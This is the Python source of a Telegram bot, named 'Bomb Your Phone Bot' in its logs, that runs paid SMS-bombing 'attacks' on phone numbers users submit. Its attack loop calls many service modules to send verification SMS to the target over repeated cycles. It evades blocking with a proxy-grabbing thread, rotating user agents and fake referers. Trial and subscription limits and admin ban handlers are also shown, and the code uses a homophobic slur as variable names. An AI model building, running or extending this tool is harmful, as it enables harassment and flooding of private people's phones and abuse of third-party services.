import asyncio
import datetime
import random
import sys
import threading

import aiohttp
import pytz

from aiogram import types, exceptions
from aiohttp_socks import ProxyConnector
from random_user_agent.params import SoftwareName, OperatingSystem
from random_user_agent.user_agent import UserAgent

import __main__
from handlers import start_message
from tools import database, proxy_grabber, misc
from tools import tools, config
from tools.database import get_user, get_users
from tools.misc import dp, thinker, check_bomber, logger, bot

active_gays = list()
active_grabber = False

if not active_grabber:
    active_grabber = True
    threading.Thread(target=proxy_grabber.grab, args=(logger, database,
                                                      config.proxoid_token)
                     ).start()


async def log(meta: dict):
    text = ("NEW ATTACK!\n\n"
            f'User Name: {database.get_user(meta["from_user"])["full_name"]}\n'
            f'ID: <code>{meta["from_user"]}</code>\n'
            f'Number: <code>{meta["formatted"]}</code>\n'
            f'Cycles: {meta["cycles"]}\n'
            f'Attack UID: <code>{meta["attack_id"]}</code>\n'
            f'Operator: {meta["operator"]}\n'
            f'Country: {meta["country"]}\n'
            f'Region: {meta["region"]}')

    kb = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(
        "Забанить",
        callback_data=f"ban_user {meta['from_user']}"
    )
    button2 = types.InlineKeyboardButton(
        'Профиль',
        callback_data=f"get_profile {meta['from_user']}"
    )
    button3 = types.InlineKeyboardButton(
        'Остановить',
        callback_data=f"stop_attack {meta['from_user']}"
    )
    button4 = types.InlineKeyboardButton(
        'Ссылка',
        url=f'tg://resolve?domain={database.get_user(meta["from_user"])["user_name"]}'
    )
    button5 = types.InlineKeyboardButton(
        'Логи',
        callback_data=f"send_logs {meta['attack_id']}"
    )

    kb.row(button1, button2)

    if database.get_user(meta["from_user"])["user_name"] is not None:
        kb.row(button3, button4)
        kb.row(button5)

    else:
        kb.row(button3, button5)
        text += f'\n\n<a href="tg://user?id={meta["from_user"]}">Mention of a user</a>'

    await bot.send_message(config.attacks_logs, text, reply_markup=kb, parse_mode='html')


def get_user_agent():
    software_names = [SoftwareName.CHROME.value, SoftwareName.LYNX.value,
                      SoftwareName.BLUE_CHROME.value, SoftwareName.EDGE.value,
                      SoftwareName.INTERNET_EXPLORER.value, SoftwareName.FIREFOX.value,
                      SoftwareName.SAFARI.value, SoftwareName.YANDEX.value,
                      SoftwareName.CHROMIUM.value]
    operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value,
                         OperatingSystem.ANDROID.value, OperatingSystem.CHROMEOS.value,
                         OperatingSystem.MAC_OS_X.value, OperatingSystem.MACOS.value,
                         OperatingSystem.DARWIN.value, OperatingSystem.IOS.value,
                         OperatingSystem.WINDOWS_PHONE.value]

    user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=100)

    user_agent = user_agent_rotator.get_random_user_agent()

    return user_agent


def get_client(proxy_status: bool):
    proxy_string = random.choice(database.get_proxys()) if proxy_status else str()

    agent = get_user_agent()
    referer = random.choice(['https://yandex.ru/', 'https://www.google.com/',
                             'https://www.bing.com/', 'https://ya.ru/', 'https://mail.ru/',
                             'https://www.rambler.ru/', 'https://www.startpage.com/',
                             'https://www.qwant.com/?l=en', 'https://duckduckgo.com/',
                             'https://www.ecosia.org/', 'https://swisscows.com/',
                             'https://www.yahoo.com/', 'https://www.youtube.com/'])

    headers = {
        "User-Agent": agent,
        "X-Requested-With": "XMLHttpRequest",
        "Referer": referer,
        "Accept-Encoding": "gzip, deflate",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,"
                  "*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Connection": "keep-alive",
        "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7"
    }

    return aiohttp.ClientSession(
        headers=headers,
        connector=ProxyConnector.from_url(f'http://{proxy_string}')
    ) if proxy_status else aiohttp.ClientSession(
        headers=headers,
        connector=aiohttp.TCPConnector(limit=300, ssl=False)
    )


def generate_attack_message(formatted: str, status: str,
                            connection: str, uid: str,
                            cycles: int, country: str,
                            region: str, operator: str,
                            send_msg: int, cycles_completed: int,
                            progressbar: str, attack_start_time: str,
                            attack_stop_time: str):
    return f'<b>Атака на номер {formatted}</b>\n\n' \
           f'<b>Статус</b>: {status}\n' \
           f'<b>Подключение</b>: {connection}\n' \
           f'<b>UID</b>: {uid}\n' \
           f'<b>Количество циклов</b>: {cycles}\n\n' \
           f'<b>Страна</b>: {country}\n' \
           f'<b>Регион</b>: {region}\n' \
           f'<b>Оператор</b>: {operator}\n\n' \
           f'<b>Время начала атаки:</b> {attack_start_time}\n' \
           f'<b>Время окончания атаки:</b> {attack_stop_time}\n\n' \
           f'<b>Количество отправленных СМС</b>: {send_msg}\n' \
           f'<b>Количество пройденных циклов</b>: {cycles_completed}\n\n' \
           f'<b>{progressbar}</b>'


def user_logger(attack_id: str, category: str, message: str, newattack: bool = False):
    if not newattack:
        for message in message.splitlines():
            with open(f'{__main__.PATH}/user_logs/{attack_id}.txt', 'a', encoding='utf8') as f:
                f.write(f'[{tools.get_formatted_time()}] [{category}] {message}\n')
    else:
        with open(f'{__main__.PATH}/user_logs/{attack_id}.txt', 'w', encoding='utf8') as f:
            f.write(f'\n   ██████╗  ██████╗ ███╗   ███╗██████╗     ██╗   ██╗ ██████╗ ██╗   ██╗██████╗ \n'
                    f'   ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗    ╚██╗ ██╔╝██╔═══██╗██║   ██║██╔══██╗\n'
                    f'   ██████╔╝██║   ██║██╔████╔██║██████╔╝     ╚████╔╝ ██║   ██║██║   ██║██████╔╝\n'
                    f'   ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗      ╚██╔╝  ██║   ██║██║   ██║██╔══██╗\n'
                    f'   ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝       ██║   ╚██████╔╝╚██████╔╝██║  ██║\n'
                    f'   ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚═╝  ╚═╝\n'
                    f'   ██████╗ ██╗  ██╗ ██████╗ ███╗   ██╗███████╗      ██████╗  ██████╗ ████████╗\n'
                    f'   ██╔══██╗██║  ██║██╔═══██╗████╗  ██║██╔════╝      ██╔══██╗██╔═══██╗╚══██╔══╝\n'
                    f'   ██████╔╝███████║██║   ██║██╔██╗ ██║█████╗        ██████╔╝██║   ██║   ██║   \n'
                    f'   ██╔═══╝ ██╔══██║██║   ██║██║╚██╗██║██╔══╝        ██╔══██╗██║   ██║   ██║   \n'
                    f'   ██║     ██║  ██║╚██████╔╝██║ ╚████║███████╗      ██████╔╝╚██████╔╝   ██║   \n'
                    f'   ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝      ╚═════╝  ╚═════╝    ╚═╝   \n\n')


def get_attack_stop_time(meta: dict, timeout: int, pause: int, cycles: int):
    quantity_services = len(tools.load_services().items())
    _time = int((((timeout / 3) + pause) * quantity_services * cycles) / 180)
    stop_time_timestamp = int(meta['started']) + (_time * 51)
    formatted = datetime.datetime.fromtimestamp(stop_time_timestamp, pytz.timezone(
        'Europe/Moscow'
    )).strftime("%H:%M:%S MSK")
    return '* ' + formatted


async def attack(message: types.Message, meta: dict, from_user: int):
    global active_grabber
    global active_gays

    await log(meta)

    attack_id = meta['attack_id']
    code = meta['code']
    number = meta['number']
    formatted = meta['formatted']
    formatted_title = meta['formatted_title']
    cycles = meta['cycles']
    operator = meta['operator']
    country = meta['country']
    region = meta['region']
    attack_start_time = datetime.datetime.fromtimestamp(meta['started'], pytz.timezone(
        'Europe/Moscow'
    )).strftime("%H:%M:%S MSK")

    user_logger(attack_id, str(), str(), True)

    latest_edited = datetime.datetime.timestamp(datetime.datetime.now())

    referer = '<a href="https://proxoid.net/?utm_source=tg&utm_medium=bot&utm_campaign=Donba_Bomber">Proxoid.net</a>'

    user_dump = database.get_user(from_user)
    proxy_status = random.choice([True, False]) if user_dump['settings']['proxy_status'] else False
    proxy_status_formatted = f'Прокси от {referer}' if proxy_status else 'Прямое'
    pause = user_dump['settings']['pause']
    timeout = user_dump['settings']['timeout']

    client = get_client(proxy_status)

    services_completed = 0
    sms_send = 0
    failed_sms = 0
    all_sms = len(tools.load_services().items()) * cycles

    kb = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(
        'Остановить атаку ⛔',
        callback_data=f"stop_attack {from_user}"
    )
    kb.row(button)

    active_gays.append(from_user)

    if len(database.get_proxys()) < config.min_proxys and not active_grabber:
        active_grabber = True
        threading.Thread(target=proxy_grabber.grab, args=(logger, database,
                                                          config.proxoid_token)
                         ).start()

    #     formatted = meta['formatted']
    #     cycles = meta['cycles']
    #     operator = meta['operator']
    #     country = meta['country']
    #     region = meta['region']

    user_logger(attack_id, 'Bomb Your Phone Bot', 'Initialization...\n'
                                                  f'ATTACK_ID: {attack_id}\n'
                                                  f'PHONE: {formatted}\n'
                                                  f'CYCLES: {cycles}\n'
                                                  f'TIMEOUT: {timeout}s\n'
                                                  f'PAUSE: {pause}s\n'
                                                  f'PHONE_COUNTRY: {country}\n'
                                                  f'PHONE_REGION: {region}\n'
                                                  f'PHONE_OPERATOR: {operator}')

    for cycle in range(1, cycles + 1):
        if from_user not in active_gays:
            user_logger(attack_id, 'Bomb Your Phone Bot', 'Attack stopped by user.')
            break

        user_logger(attack_id, 'Bomb Your Phone Bot', f'Cycle {cycle} started!')
        for module, service in tools.load_services().items():
            services_completed += 1

            if from_user not in active_gays:
                break

            if (datetime.datetime.timestamp(datetime.datetime.now()) - latest_edited) >= 15:
                try:
                    latest_edited = datetime.datetime.timestamp(datetime.datetime.now())
                    progressbar = tools.generate_progressbar(sms_send + failed_sms, all_sms)

                    user_logger(attack_id, 'Bomb Your Phone Bot', 'Message updated.')
                    await message.edit_text(generate_attack_message(formatted_title, 'В работе!',
                                                                    proxy_status_formatted, attack_id, cycles,
                                                                    country, region, operator, sms_send, cycle - 1,
                                                                    progressbar, attack_start_time,
                                                                    get_attack_stop_time(meta, timeout, pause,
                                                                                         cycles - cycle - 1)),
                                            parse_mode='html', reply_markup=kb, disable_web_page_preview=True)
                except exceptions.MessageNotModified:
                    pass
            try:
                await asyncio.sleep(pause)
                await getattr(module, service)(str(number), str(code), timeout, client).run()
                sms_send += 1
                user_logger(attack_id, service, f'Sent! ({sms_send}/{failed_sms})')
            except (ValueError, AttributeError, Exception):
                user_logger(attack_id, service, f'Not sent! Caused by {sys.exc_info()[0].__name__} '
                                                f'({sms_send}/{failed_sms})')
                failed_sms += 1
                try:
                    await client.close()
                except (BaseException, Exception):
                    pass
                proxy_status = random.choice([True, False]) if user_dump['settings']['proxy_status'] else False
                proxy_status_formatted = f'Прокси от {referer}' if proxy_status else 'Прямое'
                user_logger(attack_id, 'Bomb Your Phone Bot', 'Reconnecting...')
                client = get_client(proxy_status)
                continue

    try:
        await client.close()
    except (BaseException, Exception):
        pass

    progressbar = tools.generate_progressbar(sms_send + failed_sms, all_sms)

    kb = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton(
        'Отправить логи 💾',
        callback_data=f"send_logs {attack_id}"
    )
    kb.row(button)

    user_logger(attack_id, 'Bomb Your Phone Bot', 'Attack finished!')
    await message.edit_text(generate_attack_message(formatted_title, 'Завершено.', proxy_status_formatted,
                                                    attack_id, cycles, country, region, operator,
                                                    sms_send, cycles, progressbar, attack_start_time,
                                                    tools.get_formatted_time()),
                            parse_mode='html', reply_markup=kb,
                            disable_web_page_preview=True)

    if from_user in active_gays:
        active_gays.remove(from_user)


@dp.callback_query_handler(lambda e: e.data.startswith('send_logs'))
async def start_callback(callback_query: types.CallbackQuery):
    logger('Button', f'{tools.get_full_name(callback_query)} with id {callback_query.from_user.id} '
                     f'press button {callback_query.data}')

    try:
        attack_id = callback_query.data.split(' ', maxsplit=1)[1]
    except (BaseException, Exception):
        return

    try:
        document = open(f'{__main__.PATH}/user_logs/{attack_id}.txt', 'rb')
        await callback_query.answer('Логи отправлены! Они придут в течении минуты.', True)
        return await bot.send_document(chat_id=callback_query.from_user.id,
                                       document=document)
    except (BaseException, Exception):
        await callback_query.answer('К сожалению, мы не нашли логи для этой атаки.', True)


@dp.callback_query_handler(lambda e: e.data.startswith('unban_user'))
async def start_callback(callback_query: types.CallbackQuery):
    logger('Button', f'{tools.get_full_name(callback_query)} with id {callback_query.from_user.id} '
                     f'press button {callback_query.data}')

    try:
        user = int(callback_query.data.split(' ', maxsplit=1)[1])
    except (BaseException, Exception):
        return

    dump = database.get_user(callback_query.from_user.id)

    if not database.get_user(user)['ban_status']:
        try:
            return await callback_query.answer(f'Уже лив инсайд!', True)
        except exceptions.InvalidQueryID:
            return

    text = ("NEW UNBAN!\n\n"
            f'Admin: {dump["full_name"]}\n'
            f'UnBanned: <a href="tg://user?id={user}">user</a>\n'
            f'UserID: <code>{user}</code>')
    text += f'\nUsername: @{database.get_user(user)["user_name"]}' if database.get_user(user)["user_name"] != "" else ""

    try:
        await bot.send_message(config.attacks_logs, text, parse_mode='html')
    except exceptions.ChatNotFound:
        pass

    database.unban_user(user)

    try:
        misc.gays.remove(user)
    except (BaseException, Exception):
        pass

    text = f'<b>Вы были разблокированы администратором {dump["full_name"]}.</b>'

    try:
        await bot.send_message(user, text, parse_mode='html')
    except (Exception, BaseException):
        pass

    try:
        return await callback_query.answer(f'Пользователь {user} разбанен!', True)
    except exceptions.InvalidQueryID:
        return


@dp.callback_query_handler(lambda e: e.data.startswith('ban_user'))
async def start_callback(callback_query: types.CallbackQuery):
    logger('Button', f'{tools.get_full_name(callback_query)} with id {callback_query.from_user.id} '
                     f'press button {callback_query.data}')

    try:
        user = int(callback_query.data.split(' ', maxsplit=1)[1])
    except (BaseException, Exception):
        return

    dump = database.get_user(callback_query.from_user.id)

    if database.get_user(user)['ban_status']:
        try:
            return await callback_query.answer(f'Уже дед инсайд!', True)
        except exceptions.InvalidQueryID:
            return

    text = ("NEW BAN!\n\n"
            f'Admin: {dump["full_name"]}\n'
            f'Banned: <a href="tg://user?id={user}">user</a>\n'
            f'UserID: <code>{user}</code>')
    text += f'\nUsername: @{database.get_user(user)["user_name"]}' if database.get_user(user)["user_name"] != "" else ""
    kb = types.InlineKeyboardMarkup()
    button1 = types.InlineKeyboardButton(
        "Разбанить",
        callback_data=f"unban_user {user}"
    )
    button2 = types.InlineKeyboardButton(
        'Профиль',
        callback_data=f"get_profile {user}"
    )
    button3 = types.InlineKeyboardButton(
        'Профиль админа',
        callback_data=f"get_profile {callback_query.from_user.id}"
    )

    kb.row(button1, button2)
    kb.row(button3)

    try:
        await bot.send_message(config.attacks_logs, text, reply_markup=kb, parse_mode='html')
    except exceptions.ChatNotFound:
        pass

    database.ban_user(user)

    text = f'Вы были заблокированы администратором {dump["full_name"]}. Для ' \
           f'разблокировки, пожалуйста, ' \
           f'обратитесь в тех. поддержку (@{config.support}). ' \
           f'Ваш персональный код - <b>{user}</b>'

    misc.gays.append(user)

    try:
        await bot.send_message(user, text, parse_mode='html')
    except (Exception, BaseException):
        pass

    try:
        return await callback_query.answer(f'Пользователь {user} забанен!', True)
    except exceptions.InvalidQueryID:
        return


@dp.callback_query_handler(lambda e: e.data.startswith('get_profile'))
async def start_callback(callback_query: types.CallbackQuery):
    logger('Button', f'{tools.get_full_name(callback_query)} with id {callback_query.from_user.id} '
                     f'press button {callback_query.data}')

    try:
        user = int(callback_query.data.split(' ', maxsplit=1)[1])
    except (BaseException, Exception):
        return

    text = start_message.generate_profile_text(user)

    await bot.send_message(callback_query.from_user.id, text, parse_mode='html')

    try:
        return await callback_query.answer(f'Профиль пользователя {user} отправлен!', True)
    except exceptions.InvalidQueryID:
        return


@dp.callback_query_handler(lambda e: e.data.startswith('stop_attack'))
async def start_callback(callback_query: types.CallbackQuery):
    logger('Button', f'{tools.get_full_name(callback_query)} with id {callback_query.from_user.id} '
                     f'press button {callback_query.data}')

    try:
        from_user = int(callback_query.data.split(' ', maxsplit=1)[1])
    except (BaseException, Exception):
        return

    try:
        active_gays.remove(from_user)
    except (Exception, BaseException):
        pass

    try:
        return await callback_query.answer('Атака остановлена! Сообщение обновится в течении минуты.', True)
    except exceptions.InvalidQueryID:
        return


@dp.message_handler(content_types=['text'])
async def text_handler(message: types.Message):
    if not await thinker(message):
        return

    dump = get_user(message.from_user.id)
    checker = check_bomber(message, dump['settings']['default_cycles'])

    trial = not dump['sub_status']
    max_cycles = config.trial_cycles_count if trial else config.sub_cycles_count

    if not checker:
        text = 'Номер <b>недействителен</b>. ' \
               'Для получения информации об ' \
               'использовании бота, пожалуйста, ' \
               'используйте <b>помощь.</b>'

        reply_message = await message.reply(text, parse_mode='html')
        await asyncio.sleep(15)
        await reply_message.delete()
        return await message.delete()

    full_phone = tools.get_full_number(checker['code'], checker['number'])

    if trial and dump['trial_start_count'] < 1:
        text = 'К сожалению, ваш пробный период <b>закончился</b>. ' \
               'Для возобновления доступа к боту, пожалуйста, ' \
               'перейдите во вкладку <b>"Донат"</b> стартового сообщения.'

        reply_message = await message.reply(text, parse_mode='html')
        await asyncio.sleep(15)
        await reply_message.delete()
        return await message.delete()

    if checker['cycles'] > max_cycles:
        text = f'К сожалению, вы <b>не можете</b> использовать ' \
               f'более <b>{max_cycles} циклов</b>. Для получения более ' \
               f'подробной информации посетите вкладку <b>"Профиль"</b> ' \
               f'стартового сообщения'

        reply_message = await message.reply(text, parse_mode='html')
        await asyncio.sleep(15)
        await reply_message.delete()
        return await message.delete()

    if full_phone in get_users()['attached_phone_numbers']:
        text = f'К сожалению, вы <b>не можете</b> запустить спам на ' \
               f'данный номер телефона, так как его владелец имеет ' \
               f'подписку в нашем боте'

        reply_message = await message.reply(text, parse_mode='html')
        await asyncio.sleep(15)
        await reply_message.delete()
        return await message.delete()

    if checker['code'] not in config.available_phone_codes:
        text = f'К сожалению, вы <b>не можете</b> запустить спам на ' \
               f'данный номер телефона, так как операторы ' \
               f'данной страны не обслуживаются'

        reply_message = await message.reply(text, parse_mode='html')
        await asyncio.sleep(15)
        await reply_message.delete()
        return await message.delete()

    if message.from_user.id in active_gays:
        text = f'К сожалению, вы <b>не можете</b> запустить спам ' \
               f'на более одного номера одновременно. Пожалуйста, завершите ' \
               f'предыдущую атаку.'

        reply_message = await message.reply(text, parse_mode='html')
        await asyncio.sleep(15)
        await reply_message.delete()
        return await message.delete()

    kb = types.InlineKeyboardMarkup()
    kb.row(types.InlineKeyboardButton(
        "Wait... 🔙",
        callback_data="passed"
    ))

    reply_message = await message.reply(generate_attack_message(checker['formatted'], 'Ожидание...', 'Неизвестно',
                                                                checker['attack_id'], checker['cycles'],
                                                                checker['country'],
                                                                checker['region'], checker['operator'], 0, 0,
                                                                tools.generate_progressbar(0, 100),
                                                                tools.get_formatted_time(), 'Неизвестно'),
                                        parse_mode='html', reply_markup=kb)

    checker['started'] = tools.get_time()

    if trial:
        database.minus_attack(message.from_user.id)

    await attack(reply_message, checker, message.from_user.id)
